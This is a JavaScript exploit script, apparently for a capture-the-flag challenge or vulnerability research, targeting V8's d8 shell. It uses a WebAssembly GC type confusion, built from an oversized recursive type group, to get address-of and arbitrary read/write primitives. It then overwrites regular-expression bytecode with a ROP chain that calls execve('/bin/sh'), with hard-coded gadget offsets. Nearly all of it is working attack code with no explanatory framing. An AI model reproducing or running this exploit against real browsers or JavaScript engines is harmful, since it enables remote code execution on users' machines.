const RELEASE = true;

let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}


const kV8MaxWasmTypes = 1000000;
const kNone = kV8MaxWasmTypes + 13;

d8.file.execute("wasm-module-builder.js");

const builder = new WasmModuleBuilder();

let i32 = builder.addStruct([makeField(kWasmI32, true)]);
let i64 = builder.addStruct([makeField(kWasmI64, true)]);
let i64ref = builder.addStruct([makeField(wasmRefType(i64), true)]);
let i64ref2 = builder.addStruct([makeField(wasmRefType(i64ref), true)]);

console.log("[+] Adding recursive group...");
builder.startRecGroup();
for (let i = 4; i < kV8MaxWasmTypes; i++) {
    builder.addType(makeSig([], []));
}
builder.endRecGroup();

for (let i = kV8MaxWasmTypes; i < kNone; i++) {
    builder.addType(makeSig([], []));
}
let anyref = builder.addStruct([makeField(kWasmAnyRef, true)]);

// get (compressed) address of object
builder.addFunction("addrof", makeSig([kWasmAnyRef], [kWasmI32]))
    .addBody([
        kExprLocalGet, 0, // obj
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(anyref), // &obj
        kGCPrefix, kExprRefCast, i32, // &addr
        kGCPrefix, kExprStructGet, i32, 0, // addr
    ])
    .exportFunc();

// read 8-byte value from (compressed) address
builder.addFunction("aar", makeSig([kWasmI64], [kWasmI64]))
    .addBody([
        kExprLocalGet, 0, // addr
        kExprI64Const, 8,
        kExprI64Sub,
        kGCPrefix, kExprStructNew, i64, // &addr
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(anyref), // &&addr
        kGCPrefix, kExprRefCast, i64ref2, // &&addr
        kGCPrefix, kExprStructGet, i64ref2, 0, // &addr
        kGCPrefix, kExprStructGet, i64ref, 0, // addr
        kGCPrefix, kExprStructGet, i64, 0, // *addr
    ])
    .exportFunc();

// write 8-byte value to (compressed) address
builder.addFunction("aaw", makeSig([kWasmI64, kWasmI64], []))
    .addBody([
        kExprLocalGet, 0, // addr
        kExprI64Const, 8,
        kExprI64Sub,
        kGCPrefix, kExprStructNew, i64, // &addr
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(anyref), // &&addr
        kGCPrefix, kExprRefCast, i64ref2, // &&addr
        kGCPrefix, kExprStructGet, i64ref2, 0, // &addr
        kGCPrefix, kExprStructGet, i64ref, 0, // addr
        kExprLocalGet, 1, // value
        kGCPrefix, kExprStructSet, i64, 0, // *addr = value
    ])
    .exportFunc();

console.log("[+] Building wasm module...");
let instance = builder.instantiate();
let addrof = (obj) => { return BigInt(instance.exports.addrof(obj)); }
let aar = instance.exports.aar;
let aaw = instance.exports.aaw;


let regexp = /.*/;

let regexp_addr = addrof(regexp);
console.log(`[+] regexp_addr == ${hex(regexp_addr)}`);

let data_addr = aar(regexp_addr + 0xcn) & 0xffffffffn; // data of |regexp|
console.log(`[+] data_addr == ${hex(data_addr)}`);

regexp.exec(""); // generate bytecode

let bytecode_addr = aar(data_addr + 0x1cn) & 0xffffffffn; // bytecode array of |regexp|
console.log(`[+] bytecode_addr == ${hex(bytecode_addr)}`);


// bytecodes
const PUSH_REGISTER = 3;
const SET_REGISTER = 8;
const ADVANCE_REGISTER = 9;
const POP_REGISTER = 12;
const SUCCEED = 14;

let bytecode_arr = [];

function push(idx) {
    bytecode_arr.push(idx << 8 | PUSH_REGISTER);
}

function set(idx, value) {
    bytecode_arr.push(idx << 8 | SET_REGISTER);
    bytecode_arr.push(value);
}

function add(idx, value) {
    bytecode_arr.push(idx << 8 | ADVANCE_REGISTER);
    bytecode_arr.push(value);
}

function pop(idx) {
    bytecode_arr.push(idx << 8 | POP_REGISTER);
}

function mov(to_idx, from_idx) {
    push(from_idx);
    pop(to_idx);
}

function succeed() {
    bytecode_arr.push(SUCCEED);
}

// register index of return address
let idx = RELEASE ? 82 : 72;

// get binary base
mov(2, idx);
mov(3, idx + 1);
add(2, RELEASE ? -0xa27cc0 : -0x733cf27);

// get stack address
mov(4, idx - 2);
mov(5, idx - 1);

// "/bin/sh"
let binsh = 0x68732f6e69622fn;
set(6, binsh & 0xffffffffn);
set(7, binsh >> 32n);

// pop rdi; ret
mov(idx, 2);
mov(idx + 1, 3);
add(idx, RELEASE ? 0x108313d : 0x8266f1d);

// rdi == "/bin/sh"
mov(idx + 2, 4);
mov(idx + 3, 5);
add(idx + 2, RELEASE ? -0x1e8 : -0x230);

// pop rsi; ret
mov(idx + 4, 2);
mov(idx + 5, 3);
add(idx + 4, RELEASE ? 0xd8131e : 0xabc397e);

// rsi == 0
set(idx + 6, 0x0);
set(idx + 7, 0x0);

// pop rdx; ret
mov(idx + 8, 2);
mov(idx + 9, 3);
add(idx + 8, RELEASE ? 0xb95fc4 : 0x8e5b702);

// rdx == 0
set(idx + 10, 0x0);
set(idx + 11, 0x0);

// pop rax
mov(idx + 12, 2);
mov(idx + 13, 3);
add(idx + 12, RELEASE ? 0x11a0874 : 0x740f95b);

// rax == 0x3b
set(idx + 14, 0x3b);
set(idx + 15, 0x0);

// syscall => execve("/bin/sh", 0, 0)
mov(idx + 16, 2);
mov(idx + 17, 3);
add(idx + 16, RELEASE ? 0x16d11f0 : 0xade418e);

succeed();

// overwrite bytecode
console.log("[+] Overwriting bytecode...");
for (let i = 0; i < bytecode_arr.length; i++) {
    aaw(bytecode_addr + 0x8n + BigInt(i * 4), BigInt(bytecode_arr[i]));
}

aaw(data_addr + 0x30n, 0x2n); // set ticks until tier-up to 1 => prevent tier-up

// execute bytecode
console.log("[+] Executing bytecode...");
regexp.exec("");
